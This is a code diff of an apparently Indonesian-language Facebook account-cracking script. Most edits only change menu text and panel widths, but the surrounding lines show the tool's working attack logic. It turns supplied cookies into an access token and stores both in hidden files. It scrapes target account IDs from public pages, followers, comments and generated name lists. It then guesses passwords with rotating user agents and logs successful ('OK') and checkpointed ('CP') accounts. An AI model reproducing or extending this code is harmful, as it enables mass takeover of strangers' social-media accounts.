@@ -324,7 +324,7 @@ def login_lagi334():
 	try:
 		os.system('clear')
 		banner()
-		cetak(nel('Disarankan Untuk Menggunakan Cookie Yang Masih Fresh Untuk Melakukan Crack Account',width=47,style=f"bold cyan"))
+		cetak(nel('Disarankan Untuk Menggunakan Cookie Yang Masih Fresh Untuk Melakukan Crack Account',width=50,style=f"bold cyan"))
 		asu = random.choice([m,k,h,b,u])
 		your_cookies=input(f'  [{h}•{x}][bold white] Masukkan Cookies :{asu} ')
 		with requests.Session() as r:
@@ -370,7 +370,7 @@ def login_lagi334():
 							r.headers.update({'sec-fetch-mode': 'no-cors','referer': 'https://graph.facebook.com/','Host': 'graph.facebook.com','accept': '*/*','sec-fetch-dest': 'script','sec-fetch-site': 'cross-site',})
 							response7 = r.get(status_url, cookies = {'cookie': your_cookies}).text
 							access_token = re.search('"access_token": "(.*?)"', str(response7)).group(1)
-							print(f"\n ╰─  [bold white]Token : {asu}{access_token}")
+							print(f"\n ╰─  [bold white]Token Anda : {asu}{access_token}")
 							tokenew = open(".token.txt","w").write(access_token)
 							cook= open(".cok.txt","w").write(your_cookies)
 							print("\n ╰─  [bold white]Login Berhasil | Ketik Perintah Di Bawah Ini")
@@ -397,7 +397,7 @@ def menu(my_name,my_id):
 	ip = requests.get("https://api.ipify.org").text
 	cetak(panel(f'[bold yellow]Xyzon Dev Raja Dari Kegelapan Timur !',width=41,style=f"bold cyan"))
 	cetak(panel(f'[bold white][+[/][bold white]][/] [bold white]Username : [bold green]{my_name}[/]\n[bold white][+[/][bold white]][/] [bold white]User Idz : [bold green]{my_id}[/]\n[bold white][+[/][bold white]][/] [bold white]User Ip  : [bold green]{ip}\n[bold white][+[/][bold white]][/] [bold white]Status   : [bold green]Private[/][/]',width=42,style=f"bold cyan"))
-	cetak(panel(f'[bold white][[bold green]01[/][bold white]][/] [bold white]Crack Publick [[bold green] ON [bold white]][/]\n[bold white][[bold green]02[/][bold white]][/] [bold white]Crack Massal [[bold green] ON [bold white]][/]\n[bold white][[bold green]03[/][bold white]][/] [bold white]Crack Username [[bold green] ON [bold white]][/]\n[bold white][[bold green]04[/][bold white]][/] [bold white]Crack Followers [[bold green] ON [bold white]][/]\n[bold white][[bold green]05[/][bold white]][/] [bold white]Crack Komen [[bold green] ON [bold white]][/]\n[bold white][[bold green]06[/][bold white]][/] [bold white]Chek Hasil Crack [[bold green] ON [bold white]][/]\n[bold white][[bold green]07[/][bold white]][/] [bold white]Chekpoint Detector [[bold green] ON [bold white]][/]\n[bold white][[bold green]08[/][bold white]][/] [bold white]Lacak IP Target [[bold green] ON [bold white]][/]\n[bold white][[bold green]00[/][bold white]][/] [bold red]Hapus Cookies [[bold green] ON [bold white]][/]',width=47,title=f"[bold green]List Menu",style=f"bold cyan"))
+	cetak(panel(f'[bold white][[bold green]01[/][bold white]][/] [bold white]Crack ID Dari Publick [[bold green] ON [bold white]][/]\n[bold white][[bold green]02[/][bold white]][/] [bold white]Crack ID Dari Massal [[bold green] ON [bold white]][/]\n[bold white][[bold green]03[/][bold white]][/] [bold white]Crack ID Dari Username [[bold green] ON [bold white]][/]\n[bold white][[bold green]04[/][bold white]][/] [bold white]Crack ID Dari Followers [[bold green] ON [bold white]][/]\n[bold white][[bold green]05[/][bold white]][/] [bold white]Crack ID Dari Komen [[bold green] ON [bold white]][/]\n[bold white][[bold green]06[/][bold white]][/] [bold white]Check Hasil Crack [[bold green] ON [bold white]][/]\n[bold white][[bold green]07[/][bold white]][/] [bold white]Chekpoint Detector [[bold green] ON [bold white]][/]\n[bold white][[bold green]08[/][bold white]][/] [bold white]Lacak IP Target [[bold green] ON [bold white]][/]\n[bold white][[bold green]00[/][bold white]][/] [bold red]Hapus Cookies [[bold green] ON [bold white]][/]',width=50,title=f"[bold green]List Menu",style=f"bold cyan"))
 	_____xyzon___xd____ = input(f' ╰─  Pilih Menu Crack : ')
 	if _____xyzon___xd____ in ['1','01']:
 		brayen_dump()
@@ -458,7 +458,7 @@ def lacakip():
 		print(" [+] Alamat IP Yang Dimasukkan Salah")
 ###----------[ CRACK DARI KOMEN ]---------- ###
 def komen():
-	cetak(panel(f"Pastikan Akun Target Yang Di Pilih Bersifat Publik Jangan Private",width=90,padding=(0,4),style=f"bold white"))
+	cetak(panel(f"Pastikan Akun Target Yang Di Pilih Bersifat Publik Jangan Private",width=50,padding=(0,4),style=f"bold white"))
 	ide = input(f' ╰─  Masukan Id Postingan : ')
 	url = 'https://mbasic.facebook.com/'+ide
 	try:get_komen(url)
@@ -491,7 +491,7 @@ def pengikut():
 	except IOError:
 		exit()
 	ses = requests.Session()
-	cetak(panel(f"Ketik 'Me' Jika Ingin Crack Dari Total Followers Anda Sendiri",width=90,padding=(0,7),style=f"bold white"))
+	cetak(panel(f"Ketik 'Me' Jika Ingin Crack Dari Total Followers Anda Sendiri",width=50,padding=(0,7),style=f"bold white"))
 	akun = console.input(f' ╰─  Masukan Id Target : ')
 	try:
 		koh2 = ses.get(f'https://graph.facebook.com/{akun}?fields=subscribers.limit(5000)&access_token={token}',cookies={'cookie': cok}).json()
@@ -516,7 +516,7 @@ def crack_nama():
 	nama = []
 	custom = [" iqbal"," kami"," siska"," batam"," medan"," new"," old"," jian"," store"," tias"," rio"," lia"," farz"," marvel"," jakarta"," anisha"," juven"," der"," rika"," udin"," rayan"," tina"," hendrik"," fahmi"," baili"," rima"," gadis"," dimas"," abram"," ajis"," vicky"," charlie"," piko"," billa"]
 	custom2 = ["galang ","gilang ","gita ","steven ","aulia ","tiyas ","albert ","naura ","naira ","mancung ","dewi ","josen ","johan ","slot ","sharil ","hendrik ","edo ","ridho ","anton ","reval ","abi ","yehezkiel ","hafiz ","daniel ","angun "]
-	cetak(panel(f"    Crack Username Satu Nama Yang Ingin Di Crack Setara Dengan 5.000 Username",width=90,padding=(0,2),style=f"bold white"))
+	cetak(panel(f" Crack Username Satu Nama Setara Dengan 5.000 Username",width=50,padding=(0,2),style=f"bold white"))
 	nam = console.input(f' ╰─  Masukan Nama : ').split(",")
 	for ser in nam:		
 		for belakang in custom:
@@ -648,8 +648,8 @@ def result():
 		exit()
 #-----------------[ HASIL-CRACK ]-----------------#
 def result():
-	print(' ╰─ Hasil OK Anda [bold green]01{x} ')
-	print(' ╰─ Hasil CP Anda [bold green]02{x} ')
+	print(' ╰─ \x1b[1;97mHasil \x1b[1;92mCP \x1b[1;97mAnda \x1b[1;92m01{x} ')
+	print(' ╰─ \x1b[1;97mHasil \x1b[1;92mOK \x1b[1;97mAnda \x1b[1;92m02{x} ')
 	print(' ╰─ Kembali	')
 	kz = input('\n ╰─ Pilih : ')
 	if kz in ['1','01']:
@@ -839,7 +839,7 @@ def setting():
 	else:
 		print(' ╰─  Pilih Yang Bener Kontooll ')
 		exit()
-	cetak(panel(f'[bold white] Cobain Satu Persatu metode nya ',width=47,style=f"bold cyan"))
+	cetak(panel(f'[bold white] Cobain Satu Sampai Empat metode nya ',width=50,style=f"bold cyan"))
 	cetak(panel(f'[bold white][[bold green]01[/][bold white]][/] [bold white]Metode Mobile New [[bold green]Very Recommended[bold white]][/]\n[bold white][[bold green]02[/][bold white]][/] [bold white]Metode Async [[bold green]Recommended[bold white]][/]\n[bold white][[bold green]03[/][bold white]][/] [bold white]Metode M-Alpha [[bold green]Recommended[bold white]][/]\n[bold white][[bold green]04[/][bold white]][/] [bold white]Metode Mbasic [[bold green]Very Recommended[bold white]][/]',width=47,title=f"[bold green]Setting Metode",style=f"bold cyan"))
 	hc = input(f' ╰─  Pilih Metode : ')
 	if hc in ['1','01']:
@@ -854,7 +854,7 @@ def setting():
 		method.append('mobile')
 	cetak(panel('''[bold white][[bold green]01[bold white]] [bold white]Password Acak [[bold green]Recommended[bold white]]
 [bold white][[bold green]02[bold white]] [bold white]Password Otomatis [[bold green]Very Recommended[bold white]]
-[bold white][[bold green]03[bold white]] [bold white]Password Manual [[bold red]Not Recommended[bold white]]''',style='bold cyan',title='[bold green]Setting Password',width=47))
+[bold white][[bold green]03[bold white]] [bold white]Password Manual [[bold red]Not Recommended[bold white]]''',style='bold cyan',title='[bold green]Setting Password',width=50))
 	pwplus=input(f' ╰─  {P}Pilih sandi : ')
 	if pwplus in ['03','3']:
 		pwpluss.append('ya')
@@ -865,7 +865,7 @@ def setting():
 	else:
 		pwpluss.append('no')
 		
-	cetak(panel(f'[bold white]Apakah Anda Ingin Mengunakan User-Agent Manual Untuk Melakukan Crack Account ? Y/T',width=47,title=f"[bold green]Setting User-Agent",style=f"bold cyan"))
+	cetak(panel(f'[bold white]Apakah Anda Ingin Gunakan User-Agent Manual Y/T',width=50,title=f"[bold green]Setting User-Agent",style=f"bold cyan"))
 	uatambah = input(f' ╰─  Pilih : ')
 	if uatambah in ['y','Ya','ya','Y']:
 		ualuh.append('ya')
@@ -878,7 +878,7 @@ def setting():
 def passwrd():
 	global prog,des
 	print('')
-	cetak(panel(f' [bold green]• [bold white]Akun [bold white][[bold green]OK[bold white]][bold white] Anda Tersimpan Ke File [bold red]> [bold green]{(okc)} [bold white]\n [bold green]•[bold white] Akun [bold white][[bold yellow]CP[bold white]][bold white] Anda Tersimpan Ke File [bold red]> [bold yellow]{(cpc)}',width=70,title=f"[bold green]Informasi",subtitle=f"[bold green]On/Off Kan Mode Pesawat Jika Tidak Ada Hasil",style=f"bold cyan"))
+	cetak(panel(f' [bold green]• [bold white]Akun [bold white][[bold green]OK[bold white]][bold white] Anda Tersimpan Ke File [bold red]> [bold green]{(okc)} [bold white]\n [bold green]•[bold white] Akun [bold white][[bold yellow]CP[bold white]][bold white] Anda Tersimpan Ke File [bold red]> [bold yellow]{(cpc)}',width=50,title=f"[bold green]Informasi",subtitle=f"[bold green]On/Off Kan Mode Pesawat Jika Tidak Ada Hasil",style=f"bold cyan"))
 	prog = Progress(SpinnerColumn('smiley'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
 	des = prog.add_task('',total=len(id2))
 	with prog:
@@ -930,7 +930,7 @@ def crack(idf,pwv):
 	ua = random.choice(ugen)
 	ua2 = random.choice(ugen2)
 	ses = requests.Session()
-	prog.update(des,description=f"{P2}[{RW} ramz {P2}]{x} {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]")
+	prog.update(des,description=f"- {h}ramz{x} - [bold green][OK[bold red]-:[bold green]{ok}[bold green]][/][bold cyan]-[bold yellow][CP[bold red]-:[bold yellow]{cp}[bold yellow]] [bold cyan]{loop}[bold white]/[bold cyan]{len(id)}[/]")
 	prog.advance(des) 
 	for pw in pwv:
 		try:
